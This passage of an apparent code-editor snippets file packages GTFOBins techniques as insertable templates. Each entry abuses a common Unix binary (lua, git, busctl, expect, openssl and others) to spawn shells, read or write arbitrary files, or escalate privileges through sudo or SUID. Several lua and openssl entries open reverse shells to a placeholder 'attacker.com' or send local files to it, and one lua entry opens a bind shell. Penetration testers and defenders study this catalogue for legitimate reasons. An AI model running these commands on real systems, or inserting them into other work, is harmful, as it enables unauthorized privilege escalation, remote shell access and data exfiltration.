            "mail -f \\$TF",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse mail with shell - This creates a valid Mbox file which may be required by the binary."
    },
    "mail sudo (gtfobins)": {
        "prefix": "mail sudo",
        "body": [
            "abuse mail with sudo, GNU version only.",
            "",
            "```sh",
            "sudo mail --exec='!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse mail with sudo - GNU version only."
    },
    "logsave shell (gtfobins)": {
        "prefix": "logsave shell",
        "body": [
            "abuse logsave with shell",
            "",
            "```sh",
            "logsave /dev/null /bin/sh -i${0}",
            "```"
        ],
        "description": "abuse logsave with shell"
    },
    "logsave sudo (gtfobins)": {
        "prefix": "logsave sudo",
        "body": [
            "abuse logsave with sudo",
            "",
            "```sh",
            "sudo logsave /dev/null /bin/sh -i${0}",
            "```"
        ],
        "description": "abuse logsave with sudo"
    },
    "logsave suid (gtfobins)": {
        "prefix": "logsave suid",
        "body": [
            "abuse logsave with suid",
            "",
            "```sh",
            "./logsave /dev/null /bin/sh -i -p${0}",
            "```"
        ],
        "description": "abuse logsave with suid"
    },
    "screen shell (gtfobins)": {
        "prefix": "screen shell",
        "body": [
            "abuse screen with shell",
            "",
            "```sh",
            "screen${0}",
            "```"
        ],
        "description": "abuse screen with shell"
    },
    "screen file-write (gtfobins)": {
        "prefix": "screen file-write",
        "body": [
            "abuse screen with file-write, This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "screen -L \\$LFILE echo DATA${0}",
            "```"
        ],
        "description": "abuse screen with file-write - This works on screen version 4.05.00. Data is appended to the file and `\\n` is converted to `\\r\\n`."
    },
    "screen sudo (gtfobins)": {
        "prefix": "screen sudo",
        "body": [
            "abuse screen with sudo",
            "",
            "```sh",
            "sudo screen${0}",
            "```"
        ],
        "description": "abuse screen with sudo"
    },
    "yelp file-read (gtfobins)": {
        "prefix": "yelp file-read",
        "body": [
            "abuse yelp with file-read, This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "yelp \"man:\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse yelp with file-read - This spawns a graphical window containing the file content somehow corrupted by word wrapping, it might not be suitable to read arbitrary files. The path must be absolute."
    },
    "bc file-read (gtfobins)": {
        "prefix": "bc file-read",
        "body": [
            "abuse bc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with file-read"
    },
    "bc sudo (gtfobins)": {
        "prefix": "bc sudo",
        "body": [
            "abuse bc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with sudo"
    },
    "bc suid (gtfobins)": {
        "prefix": "bc suid",
        "body": [
            "abuse bc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bc -s \\$LFILE",
            "quit${0}",
            "```"
        ],
        "description": "abuse bc with suid"
    },
    "lua shell (gtfobins)": {
        "prefix": "lua shell",
        "body": [
            "abuse lua with shell",
            "",
            "```sh",
            "lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with shell"
    },
    "lua non-interactive-reverse-shell (gtfobins)": {
        "prefix": "lua non-interactive-reverse-shell",
        "body": [
            "abuse lua with non-interactive-reverse-shell, Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "lua -e 'local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  while true do",
            "    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));t:send(b);",
            "  end;",
            "  f:close();t:close();'${0}",
            "```"
        ],
        "description": "abuse lua with non-interactive-reverse-shell - Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires `lua-socket` installed."
    },
    "lua non-interactive-bind-shell (gtfobins)": {
        "prefix": "lua non-interactive-bind-shell",
        "body": [
            "abuse lua with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export LPORT=${1:12345}",
            "lua -e 'local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  while true do",
            "    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));",
            "    local b=assert(f:read(\"*a\"));c:send(b);",
            "  end;c:close();f:close();'${0}",
            "```"
        ],
        "description": "abuse lua with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This requires `lua-socket` installed."
    },
    "lua file-upload (gtfobins)": {
        "prefix": "lua file-upload",
        "body": [
            "abuse lua with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "lua -e '",
            "  local f=io.open(os.getenv(\"LFILE\"), 'rb')",
            "  local d=f:read(\"*a\")",
            "  io.close(f);",
            "  local s=require(\"socket\");",
            "  local t=assert(s.tcp());",
            "  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));",
            "  t:send(d);",
            "  t:close();'${0}",
            "```"
        ],
        "description": "abuse lua with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires `lua-socket` installed."
    },
    "lua file-download (gtfobins)": {
        "prefix": "lua file-download",
        "body": [
            "abuse lua with file-download, Fetch a remote file via TCP. Run `nc target.com 12345\n< \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed.",
            "",
            "```sh",
            "export LPORT=${2:12345}",
            "export LFILE=${1:file_to_save}",
            "lua -e 'local k=require(\"socket\");",
            "  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));",
            "  local c=s:accept();",
            "  local d,x=c:receive(\"*a\");",
            "  c:close();",
            "  local f=io.open(os.getenv(\"LFILE\"), \"wb\");",
            "  f:write(d);",
            "  io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-download - Fetch a remote file via TCP. Run `nc target.com 12345\n< \"file_to_send\"` on the attacker box to send the file. This requires `lua-socket` installed."
    },
    "lua file-write (gtfobins)": {
        "prefix": "lua file-write",
        "body": [
            "abuse lua with file-write",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_write}\", \"wb\"); f:write(\"DATA\"); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-write"
    },
    "lua file-read (gtfobins)": {
        "prefix": "lua file-read",
        "body": [
            "abuse lua with file-read",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_read}\", \"rb\"); print(f:read(\"*a\")); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with file-read"
    },
    "lua suid (gtfobins)": {
        "prefix": "lua suid",
        "body": [
            "abuse lua with suid",
            "",
            "```sh",
            "lua -e 'local f=io.open(\"${1:file_to_read}\", \"rb\"); print(f:read(\"*a\")); io.close(f);'${0}",
            "```"
        ],
        "description": "abuse lua with suid"
    },
    "lua sudo (gtfobins)": {
        "prefix": "lua sudo",
        "body": [
            "abuse lua with sudo",
            "",
            "```sh",
            "sudo lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with sudo"
    },
    "lua limited-suid (gtfobins)": {
        "prefix": "lua limited-suid",
        "body": [
            "abuse lua with limited-suid",
            "",
            "```sh",
            "./lua -e 'os.execute(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse lua with limited-suid"
    },
    "msgattrib file-read (gtfobins)": {
        "prefix": "msgattrib file-read",
        "body": [
            "abuse msgattrib with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with file-read"
    },
    "msgattrib sudo (gtfobins)": {
        "prefix": "msgattrib sudo",
        "body": [
            "abuse msgattrib with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with sudo"
    },
    "msgattrib suid (gtfobins)": {
        "prefix": "msgattrib suid",
        "body": [
            "abuse msgattrib with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgattrib -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgattrib with suid"
    },
    "busctl shell (gtfobins)": {
        "prefix": "busctl shell",
        "body": [
            "abuse busctl with shell",
            "",
            "```sh",
            "busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with shell"
    },
    "busctl sudo (gtfobins)": {
        "prefix": "busctl sudo",
        "body": [
            "abuse busctl with sudo",
            "",
            "```sh",
            "sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with sudo"
    },
    "busctl suid (gtfobins)": {
        "prefix": "busctl suid",
        "body": [
            "abuse busctl with suid",
            "",
            "```sh",
            "./busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-pc,argv2='/bin/sh -p -i 0<&2 1>&2'${0}",
            "```"
        ],
        "description": "abuse busctl with suid"
    },
    "csplit file-read (gtfobins)": {
        "prefix": "csplit file-read",
        "body": [
            "abuse csplit with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with file-read"
    },
    "csplit file-write (gtfobins)": {
        "prefix": "csplit file-write",
        "body": [
            "abuse csplit with file-write, Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "LFILE=${1:file_to_write}",
            "csplit -z -b \"%d\\$LFILE\" \\$TF 1${0}",
            "```"
        ],
        "description": "abuse csplit with file-write - Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`)."
    },
    "csplit suid (gtfobins)": {
        "prefix": "csplit suid",
        "body": [
            "abuse csplit with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with suid"
    },
    "csplit sudo (gtfobins)": {
        "prefix": "csplit sudo",
        "body": [
            "abuse csplit with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "csplit \\$LFILE 1",
            "cat xx01${0}",
            "```"
        ],
        "description": "abuse csplit with sudo"
    },
    "tee file-write (gtfobins)": {
        "prefix": "tee file-write",
        "body": [
            "abuse tee with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with file-write"
    },
    "tee suid (gtfobins)": {
        "prefix": "tee suid",
        "body": [
            "abuse tee with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with suid"
    },
    "tee sudo (gtfobins)": {
        "prefix": "tee sudo",
        "body": [
            "abuse tee with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | sudo tee -a \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tee with sudo"
    },
    "iftop shell (gtfobins)": {
        "prefix": "iftop shell",
        "body": [
            "abuse iftop with shell",
            "",
            "```sh",
            "iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with shell"
    },
    "iftop limited-suid (gtfobins)": {
        "prefix": "iftop limited-suid",
        "body": [
            "abuse iftop with limited-suid",
            "",
            "```sh",
            "./iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with limited-suid"
    },
    "iftop sudo (gtfobins)": {
        "prefix": "iftop sudo",
        "body": [
            "abuse iftop with sudo",
            "",
            "```sh",
            "sudo iftop",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse iftop with sudo"
    },
    "wc file-read (gtfobins)": {
        "prefix": "wc file-read",
        "body": [
            "abuse wc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with file-read"
    },
    "wc suid (gtfobins)": {
        "prefix": "wc suid",
        "body": [
            "abuse wc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with suid"
    },
    "wc sudo (gtfobins)": {
        "prefix": "wc sudo",
        "body": [
            "abuse wc with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo wc --files0-from \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wc with sudo"
    },
    "eb shell (gtfobins)": {
        "prefix": "eb shell",
        "body": [
            "abuse eb with shell",
            "",
            "```sh",
            "eb logs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse eb with shell"
    },
    "eb sudo (gtfobins)": {
        "prefix": "eb sudo",
        "body": [
            "abuse eb with sudo",
            "",
            "```sh",
            "sudo eb logs",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse eb with sudo"
    },
    "elvish file-read (gtfobins)": {
        "prefix": "elvish file-read",
        "body": [
            "abuse elvish with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "elvish -c 'echo (slurp <\\$E:LFILE)'${0}",
            "```"
        ],
        "description": "abuse elvish with file-read"
    },
    "elvish file-write (gtfobins)": {
        "prefix": "elvish file-write",
        "body": [
            "abuse elvish with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "elvish -c 'echo DATA >\\$E:LFILE'${0}",
            "```"
        ],
        "description": "abuse elvish with file-write"
    },
    "elvish shell (gtfobins)": {
        "prefix": "elvish shell",
        "body": [
            "abuse elvish with shell",
            "",
            "```sh",
            "elvish${0}",
            "```"
        ],
        "description": "abuse elvish with shell"
    },
    "elvish suid (gtfobins)": {
        "prefix": "elvish suid",
        "body": [
            "abuse elvish with suid",
            "",
            "```sh",
            "./elvish${0}",
            "```"
        ],
        "description": "abuse elvish with suid"
    },
    "elvish sudo (gtfobins)": {
        "prefix": "elvish sudo",
        "body": [
            "abuse elvish with sudo",
            "",
            "```sh",
            "sudo elvish${0}",
            "```"
        ],
        "description": "abuse elvish with sudo"
    },
    "xdg-user-dir shell (gtfobins)": {
        "prefix": "xdg-user-dir shell",
        "body": [
            "abuse xdg-user-dir with shell",
            "",
            "```sh",
            "xdg-user-dir '}; /bin/sh #'${0}",
            "```"
        ],
        "description": "abuse xdg-user-dir with shell"
    },
    "xdg-user-dir sudo (gtfobins)": {
        "prefix": "xdg-user-dir sudo",
        "body": [
            "abuse xdg-user-dir with sudo",
            "",
            "```sh",
            "sudo xdg-user-dir '}; /bin/sh #'${0}",
            "```"
        ],
        "description": "abuse xdg-user-dir with sudo"
    },
    "troff file-read (gtfobins)": {
        "prefix": "troff file-read",
        "body": [
            "abuse troff with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with file-read"
    },
    "troff suid (gtfobins)": {
        "prefix": "troff suid",
        "body": [
            "abuse troff with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with suid"
    },
    "troff sudo (gtfobins)": {
        "prefix": "troff sudo",
        "body": [
            "abuse troff with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo troff \\$LFILE${0}",
            "```"
        ],
        "description": "abuse troff with sudo"
    },
    "setlock shell (gtfobins)": {
        "prefix": "setlock shell",
        "body": [
            "abuse setlock with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "setlock \\$TF /bin/sh${0}",
            "```"
        ],
        "description": "abuse setlock with shell"
    },
    "setlock suid (gtfobins)": {
        "prefix": "setlock suid",
        "body": [
            "abuse setlock with suid",
            "",
            "```sh",
            "./setlock - /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse setlock with suid"
    },
    "setlock sudo (gtfobins)": {
        "prefix": "setlock sudo",
        "body": [
            "abuse setlock with sudo",
            "",
            "```sh",
            "sudo setlock - /bin/sh${0}",
            "```"
        ],
        "description": "abuse setlock with sudo"
    },
    "git shell (gtfobins)": {
        "prefix": "git shell",
        "body": [
            "abuse git with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "ln -s /bin/sh \"\\$TF/git-x\"",
            "git \"--exec-path=\\$TF\" x${0}",
            "```"
        ],
        "description": "abuse git with shell"
    },
    "git file-read (gtfobins)": {
        "prefix": "git file-read",
        "body": [
            "abuse git with file-read, The read file content is displayed in `diff` style output format.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "git diff /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse git with file-read - The read file content is displayed in `diff` style output format."
    },
    "git file-write (gtfobins)": {
        "prefix": "git file-write",
        "body": [
            "abuse git with file-write, The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`.",
            "",
            "```sh",
            "git apply --unsafe-paths --directory / x.patch${0}",
            "```"
        ],
        "description": "abuse git with file-write - The patch can be created locally by creating the file that will be written on the target using its absolute path, then `git diff /dev/null /path/to/file >x.patch`."
    },
    "git sudo (gtfobins)": {
        "prefix": "git sudo",
        "body": [
            "abuse git with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "ln -s /bin/sh \"\\$TF/git-x\"",
            "sudo git \"--exec-path=\\$TF\" x${0}",
            "```"
        ],
        "description": "abuse git with sudo"
    },
    "git limited-suid (gtfobins)": {
        "prefix": "git limited-suid",
        "body": [
            "abuse git with limited-suid",
            "",
            "```sh",
            "PAGER='sh -c \"exec sh 0<&1\"' ./git -p help${0}",
            "```"
        ],
        "description": "abuse git with limited-suid"
    },
    "fmt file-read (gtfobins)": {
        "prefix": "fmt file-read",
        "body": [
            "abuse fmt with file-read, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with file-read - This corrupts the output by wrapping very long lines at the given width."
    },
    "fmt suid (gtfobins)": {
        "prefix": "fmt suid",
        "body": [
            "abuse fmt with suid, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with suid - This corrupts the output by wrapping very long lines at the given width."
    },
    "fmt sudo (gtfobins)": {
        "prefix": "fmt sudo",
        "body": [
            "abuse fmt with sudo, This corrupts the output by wrapping very long lines at the given width.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fmt -999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fmt with sudo - This corrupts the output by wrapping very long lines at the given width."
    },
    "clamscan file-read (gtfobins)": {
        "prefix": "clamscan file-read",
        "body": [
            "abuse clamscan with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with file-read"
    },
    "clamscan suid (gtfobins)": {
        "prefix": "clamscan suid",
        "body": [
            "abuse clamscan with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "./clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with suid"
    },
    "clamscan sudo (gtfobins)": {
        "prefix": "clamscan sudo",
        "body": [
            "abuse clamscan with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "TF=\\$(mktemp -d)",
            "touch \\$TF/empty.yara",
            "sudo clamscan --no-summary -d \\$TF -f \\$LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory\\$/\\1/p'${0}",
            "```"
        ],
        "description": "abuse clamscan with sudo"
    },
    "loginctl shell (gtfobins)": {
        "prefix": "loginctl shell",
        "body": [
            "abuse loginctl with shell",
            "",
            "```sh",
            "loginctl user-status",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse loginctl with shell"
    },
    "loginctl sudo (gtfobins)": {
        "prefix": "loginctl sudo",
        "body": [
            "abuse loginctl with sudo",
            "",
            "```sh",
            "sudo loginctl user-status",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse loginctl with sudo"
    },
    "tail file-read (gtfobins)": {
        "prefix": "tail file-read",
        "body": [
            "abuse tail with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with file-read"
    },
    "tail suid (gtfobins)": {
        "prefix": "tail suid",
        "body": [
            "abuse tail with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with suid"
    },
    "tail sudo (gtfobins)": {
        "prefix": "tail sudo",
        "body": [
            "abuse tail with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tail -c1G \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tail with sudo"
    },
    "rpmverify shell (gtfobins)": {
        "prefix": "rpmverify shell",
        "body": [
            "abuse rpmverify with shell",
            "",
            "```sh",
            "rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with shell"
    },
    "rpmverify limited-suid (gtfobins)": {
        "prefix": "rpmverify limited-suid",
        "body": [
            "abuse rpmverify with limited-suid",
            "",
            "```sh",
            "./rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with limited-suid"
    },
    "rpmverify sudo (gtfobins)": {
        "prefix": "rpmverify sudo",
        "body": [
            "abuse rpmverify with sudo",
            "",
            "```sh",
            "sudo rpmverify --eval '%(/bin/sh 1>&2)'${0}",
            "```"
        ],
        "description": "abuse rpmverify with sudo"
    },
    "tshark shell (gtfobins)": {
        "prefix": "tshark shell",
        "body": [
            "abuse tshark with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "tshark -Xlua_script:\\$TF${0}",
            "```"
        ],
        "description": "abuse tshark with shell"
    },
    "msgfilter shell (gtfobins)": {
        "prefix": "msgfilter shell",
        "body": [
            "abuse msgfilter with shell, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with shell - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "msgfilter file-read (gtfobins)": {
        "prefix": "msgfilter file-read",
        "body": [
            "abuse msgfilter with file-read, The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgfilter -P -i \"LFILE\" /bin/cat${0}",
            "```"
        ],
        "description": "abuse msgfilter with file-read - The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data. `/bin/cat` can be replaced with any other *filter* program."
    },
    "msgfilter sudo (gtfobins)": {
        "prefix": "msgfilter sudo",
        "body": [
            "abuse msgfilter with sudo, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | sudo msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with sudo - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "msgfilter suid (gtfobins)": {
        "prefix": "msgfilter suid",
        "body": [
            "abuse msgfilter with suid, Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once.",
            "",
            "```sh",
            "echo x | ./msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill \\$PPID'${0}",
            "```"
        ],
        "description": "abuse msgfilter with suid - Any text file will do as the input (use `-i`). `kill` is needed to spawn the shell only once."
    },
    "expect file-read (gtfobins)": {
        "prefix": "expect file-read",
        "body": [
            "abuse expect with file-read, The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "expect \\$LFILE${0}",
            "```"
        ],
        "description": "abuse expect with file-read - The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files."
    },
    "expect shell (gtfobins)": {
        "prefix": "expect shell",
        "body": [
            "abuse expect with shell",
            "",
            "```sh",
            "expect -c 'spawn /bin/sh;interact'${0}",
            "```"
        ],
        "description": "abuse expect with shell"
    },
    "expect suid (gtfobins)": {
        "prefix": "expect suid",
        "body": [
            "abuse expect with suid",
            "",
            "```sh",
            "./expect -c 'spawn /bin/sh -p;interact'${0}",
            "```"
        ],
        "description": "abuse expect with suid"
    },
    "expect sudo (gtfobins)": {
        "prefix": "expect sudo",
        "body": [
            "abuse expect with sudo",
            "",
            "```sh",
            "sudo expect -c 'spawn /bin/sh;interact'${0}",
            "```"
        ],
        "description": "abuse expect with sudo"
    },
    "openssl reverse-shell (gtfobins)": {
        "prefix": "openssl reverse-shell",
        "body": [
            "abuse openssl with reverse-shell, \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \\$RHOST:\\$RPORT > /tmp/s; rm /tmp/s${0}",
            "```"
        ],
        "description": "abuse openssl with reverse-shell - \nTo receive the shell run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\n\n\nCommunication between attacker and target will be encrypted.\n"
    },
    "openssl file-upload (gtfobins)": {
        "prefix": "openssl file-upload",
        "body": [
            "abuse openssl with file-upload, \nTo collect the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\n\n\nSend a local file via TCP. Transmission will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "openssl s_client -quiet -connect \\$RHOST:\\$RPORT < \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-upload - \nTo collect the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\n\n\nSend a local file via TCP. Transmission will be encrypted.\n"
    },
    "openssl file-download (gtfobins)": {
        "prefix": "openssl file-download",
        "body": [
            "abuse openssl with file-download, \nTo send the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\n\n\nFetch a file from a TCP port, transmission will be encrypted.\n",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_save}",
            "openssl s_client -quiet -connect \\$RHOST:\\$RPORT > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openssl with file-download - \nTo send the file run the following on the attacker box:\n\n\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\n\n\nFetch a file from a TCP port, transmission will be encrypted.\n"
    },
    "openssl file-write (gtfobins)": {
        "prefix": "openssl file-write",
        "body": [
            "abuse openssl with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "openssl enc -in \"\\$TF\" -out \"\\$LFILE\"${0}",
